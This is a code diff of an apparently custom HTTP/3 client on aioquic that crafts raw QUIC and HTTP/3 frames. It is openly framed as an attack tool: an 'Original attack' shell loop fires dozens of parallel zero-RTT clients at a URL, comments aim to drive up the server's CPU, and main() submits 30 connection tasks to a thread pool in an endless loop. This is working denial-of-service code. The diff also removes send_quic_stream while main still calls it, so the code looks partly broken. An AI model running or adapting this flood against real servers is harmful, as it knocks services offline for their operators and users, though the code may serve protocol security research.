@@ -51,27 +51,6 @@ class HttpClient():
         headers_data = bytes.fromhex(h3_layer.payload.raw_value)
         return aioquic.h3.connection.encode_frame(FrameType.HEADERS, headers_data)
 
-    def send_quic_stream(self, frame_data, stream_id):
-        """
-        Function to send frame_data over the QUIC stream.
-        Uses the stream_id from h3msg to send over the same stream.
-        """
-        builder = self.get_builder(Epoch.ONE_RTT)
-
-        buf = builder.start_frame(
-            QuicFrameType.STREAM_BASE | 2,
-            capacity=4,  # Capacity setting for stream transmission
-        )
-
-        # Use the extracted stream_id
-        buf.push_uint_var(stream_id)  # Use the stream_id extracted from h3msg
-
-        buf.push_uint16(len(frame_data) | 0x4000)  # Set the length of the data
-        buf.push_bytes(frame_data)  # Add the actual frame data to the stream
-
-        # Send the packet
-        self.send_quic_frames_from_builder(builder)
-
     def craft_sample_headers_frame(self):
         """
         Craft a sample HEADERS frame
@@ -81,20 +60,27 @@ class HttpClient():
         stream_id = self._quic.get_next_available_stream_id()
 
         headers = [
-                (b":method", "GET".encode()),
+                (b":method", "POST".encode()),
                 (b":scheme", "HTTPS".encode()),
                 (b":authority", self.hostname.encode()),
                 (b":path", "/600k.html".encode()),
-                (b"user-agent", "PRETT3 client".encode()),
-                (b"method", "HEAD".encode()),
-                (b"method", "POST".encode()),
-                (b"method", "GET".encode()),
-                (b"settings", "0".encode()),
+                (b"user-agent", "PRETT3 client".encode())
             ]
 
         frame_data =  self._http._encode_headers(stream_id, headers)
 
         return aioquic.h3.connection.encode_frame(FrameType.HEADERS, frame_data)
+    
+    def craft_sample_data_frame(self):
+        """
+        Craft a sample DATA frame
+        """
+        
+        print("\nCrafting a sample DATA frame")
+
+        data = "A"*10
+
+        return aioquic.h3.connection.encode_frame(FrameType.DATA, data.encode())
 
 
     def get_builder(self, epoch: Epoch):
@@ -151,25 +137,6 @@ class HttpClient():
         buf.push_bytes(frame_data) # data
 
         self.send_quic_frames_from_builder(builder)
-
-    # sample
-    def send_quic_ack(self, acked_packet_num):
-        
-        builder = self.get_builder()
-
-        buf = builder.start_frame(
-                    QuicFrameType.ACK, # frame type
-                    capacity=ACK_FRAME_CAPACITY,
-                    #handler_args=(limit,),
-                )
-        
-        buf.push_uint_var(acked_packet_num) # largest acknowledged
-        buf.push_uint_var(106) # ack delay
-        buf.push_uint_var(0) # ack range count
-        buf.push_uint_var(0) # ack range
-
-        self.send_quic_frames_from_builder(builder)
-
 
     def send_quic_frames_from_builder(self, builder:QuicPacketBuilder):
         datagrams, packets = builder.flush()
@@ -800,25 +767,31 @@ class HttpClient():
         except socket.timeout: pass
 
 
+
+""" 
+Original attack:
+while true
+do
+    echo "\e[0;31mInitiate attack\e[0m"
+    #Or seq 1 100 | timeout 5s xargs -n1 -P100
+    sudo seq 1 30 | timeout 1s xargs -n1 -P30 python3 examples/http3_client.py --zero-rtt URL 
+    echo "\e[0;32mSleep...\e[0m"
+    sleep 30;
+done
 """
-We can achieve a successful attack even without those extra headers and body.
+
+"""
+
 """
 def main(
     configuration: QuicConfiguration,
     url: str
 ) -> None:
     
-    
-    
     def background_task():
         
         # Step 1: Initialize the HTTP/3 client with QUIC configuration
         h3client = HttpClient(configuration, urlparse(url).netloc)
-        '''
-        A new h3client object should be created for each task. 
-        If we use the same object for all, it will not increase CPU.
-        One reason might be that differnt h3clients have different connection IDs
-        '''
 
         # Step 2: Establish the initial connection (handshake)
         print("\033[93m\n[Establishing connection via Crypto message...]\033[0m")
@@ -834,13 +807,15 @@ def main(
         h3client.send_quic_stream(headers_data)
         h3client.read_from_buffer()
 
+    #background_task()
+    #sys.exit()
     with concurrent.futures.ThreadPoolExecutor() as executor:
         futures = []
         while True:
-            for i in range(10):
+            for i in range(30):
                 # Submit each iteration as a separate task
                 futures.append(executor.submit(background_task))
-            time.sleep(1)
+            time.sleep(30)
 
 
 if __name__ == "__main__":
